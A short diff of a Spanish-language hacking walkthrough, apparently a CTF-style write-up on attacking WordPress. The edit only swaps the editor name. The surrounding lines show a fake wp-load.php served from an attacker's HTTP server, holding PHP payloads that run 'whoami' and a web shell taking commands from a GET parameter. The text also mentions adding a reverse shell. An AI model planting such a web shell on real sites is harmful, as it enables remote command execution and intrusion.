@@ -42,7 +42,7 @@ Debemos de tener activo un servidor http en nuestra maquina de atacante
 
 Por lo que debemos de crear ese archivo para cargar comandos y también podemos colocarle una ReverShell.
 ```php
-❯ nano wp-load.php
+❯ nvim wp-load.php
 	<?php
 		system("whoami");
 	?>
@@ -52,7 +52,7 @@ Por lo que debemos de crear ese archivo para cargar comandos y también podemos 
 
 O podemos controlar el comando
 ```php
-❯ nano wp-load.php
+❯ nvim wp-load.php
 	<?php
 		system($_GET["cmd"]);
 	?>
